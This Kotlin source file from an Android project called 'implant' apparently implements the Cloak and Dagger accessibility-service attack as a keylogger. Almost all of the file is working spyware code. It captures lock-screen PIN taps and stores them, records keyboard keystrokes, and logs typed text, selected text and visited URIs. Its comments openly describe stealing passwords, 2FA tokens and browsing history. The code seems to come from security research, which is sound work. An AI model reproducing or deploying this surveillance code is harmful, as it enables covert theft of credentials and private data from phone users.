/*
* Uses an AccessibilityService as a keylogger.
* Based on Cloak and Dagger: From Two Permissions to Complete Control of the UI Feedback Loop by
* Yanick Fratantonio, Chenxiong Qian, Simon P. Chung, Wenke Lee. 
* 
* Although this cannot see passwords from EditText due to Android's restrictions, we can see text
* the user selects, browser history and non-password text they enter.
* We are also able to record their security PIN when they log in.
* */
package com.cooperthecoder.implant.dagger

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.cooperthecoder.implant.Config
import com.cooperthecoder.implant.data.SharedPreferencesQuery
import com.cooperthecoder.implant.magic.selected
import com.cooperthecoder.implant.magic.strings
import com.cooperthecoder.implant.magic.uris

class DaggerService : AccessibilityService() {

    companion object {
        private val TAG: String = DaggerService::class.java.name
        private var running: Boolean = false

        fun isRunning(): Boolean {
            return running
        }
    }

    lateinit var pinRecorder: PinRecorder
    lateinit var keyLogger: KeyLogger

    override fun onCreate() {
        super.onCreate()
        pinRecorder = PinRecorder(fun(pin: String) {
            val added = SharedPreferencesQuery.addLastPinEntered(this, pin)
            if (added) {
                Log.d(TAG, "Pin recorded: $pin")
            } else {
                Log.d(TAG, "Failed to record: $pin")
            }
        })

        keyLogger = KeyLogger()
    }

    override fun onInterrupt() {
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (eventIsSkippable(event)) return
        when (event.packageName) {
            Config.SYSTEMUI_PACKAGE_NAME -> {
                logEvent(event, event.toString())
                when (event.eventType) {
                    AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                        logEvent(event, event.className.toString())
                        // This is a PIN, let's record it.
                        pinRecorder.appendPinDigit(event.text.toString(), event.eventTime)
                    }
                }
            }

            Config.KEYBOARD_PACKAGE_NAME -> {
                when (event.eventType) {
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                        val source = event.source
                        val keystroke = source?.text?.toString()
                        if (keystroke != null) {
                            keyLogger.recordKeystroke(keystroke, event.eventTime)
                        }
                    }

                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                        if (event.text?.toString()?.toLowerCase() == Config.KEYBOARD_DISMISSED_TEXT) {
                            val keystrokes = keyLogger.emptyKeyQueue()
                            Log.d(TAG, "Got keystrokes: $keystrokes")
                        }
                    }
                }
            }
        }

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                // This event type is fired when text is entered in any EditText that is not a
                // password.
                for (string in event.strings()) {
                    logEvent(event, "Captured from EditText: $string")
                }
            }

            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
                // This event type includes clicked links, as well as selected text.
                // We can record their browsing history as well as steal passwords and 2FA tokens
                // that are selected.
                for (string in event.selected()) {
                    logEvent(event, "Text selected: $string")
                }
                for (uri in event.uris()) {
                    logEvent(event, "URI detected: $uri")
                }
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        serviceInfo = accessibilityServiceInfo()
        running = true
        Log.d(TAG, "DaggerService started.")
    }


    override fun onDestroy() {
        super.onDestroy()
        running = false
        Log.d(TAG, "Stopping DaggerService.")
    }

    private fun accessibilityServiceInfo(): AccessibilityServiceInfo {
        val info = AccessibilityServiceInfo()
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.JELLY_BEAN_MR2) {
            info.flags = info.flags or
                    AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
        }

        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.LOLLIPOP) {
            info.flags = info.flags or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        }

        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED or
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                AccessibilityEvent.TYPE_VIEW_CLICKED or
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        return info
    }

    private fun logEvent(event: AccessibilityEvent, message: String) {
        Log.d(TAG + " - " + event.packageName, message)
    }

    private fun eventIsSkippable(event: AccessibilityEvent): Boolean {
        return event.isPassword
    }

}